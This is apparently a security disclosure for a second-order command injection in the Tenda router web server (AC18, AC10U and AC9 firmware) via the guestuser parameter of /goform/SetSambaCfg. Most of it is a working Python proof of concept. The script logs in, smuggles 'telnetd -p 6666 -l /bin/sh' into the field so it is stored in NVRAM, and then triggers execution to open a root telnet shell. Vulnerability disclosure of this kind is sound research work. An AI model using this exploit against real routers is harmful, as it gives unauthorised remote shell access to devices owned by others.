

I found a command injection vulnerability in the Tenda router's webserver. While processing the `guestuser` parameters for a post request to `/goform/SetSambaCfg`, the payload is directly stored into NVRAM. When a post request is sent again to `/goform/SetSambaCfg`, the payload is read from NVRAM and executed. It's like Second-Order SQL Injection Attack. The details are shown below:


## Overview

Vendor: Tenda

Product:
- AC18 device, Firmware V15.03.05.19(6318) and earlier version
- AC10UV1.0 device, Firmware V15.03.06.49 and earlier version
- AC9V1.0 device, Firmware V15.03.05.19 and earlier version
- AC9V3.0 device, Firmware V15.03.06.42 and earlier version

Vulnerability type: command injection

Discoverer: longuan@iie 


## Details

1. First, `websGetVar()` retrieves the content of `guestuser` from HTTP POST request, then store it into NVRAM using `SetValue("usb.samba.guest.user", v7);`.

![image](/vulns/Tenda/images/details-3-1.png)

2. Then we access this function again. It will load the previously stored payload using `GetValue("usb.samba.guest.user", s);`. The payload directly passed to `doSystemCmd("busybox deluser %s", s);`, which cause a RCE.

![image](/vulns/Tenda/images/details-3-2.png)


## PoC

```py
# coding:utf-8

import requests

header = {
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

s = requests.session()
s.headers.update(header)

# login 

login_req = s.post("http://192.168.0.1/login/Auth", data="username=admin&password=70ebc4f9c9d22827a5874d1bb6f06abd")

# First, store telnet payload into NVRAM. `telenetd -p 6666 -l /bin/sh` 

req = s.post("http://192.168.0.1/goform/SetSambaCfg", data="fileCode=UTF-8&password=admin&premitEn=0&guestpwd=guests&guestuser=guest1%3btelnetd%20-p%206666%20-l%20/bin/sh%3b&guestaccess=r&internetPort=21")

# Second, send a post request again, trigger the vulnerability.

req = s.post("http://192.168.0.1/goform/SetSambaCfg", data="fileCode=UTF-8&password=admin&premitEn=0&guestpwd=guests&guestuser=guest1&guestaccess=r&internetPort=21")
print(req.text)

# Finally, using `telnet 192.168.0.1 6666` in terminal can get router's shell
```

![image](/vulns/Tenda/images/poc-3-1.png)


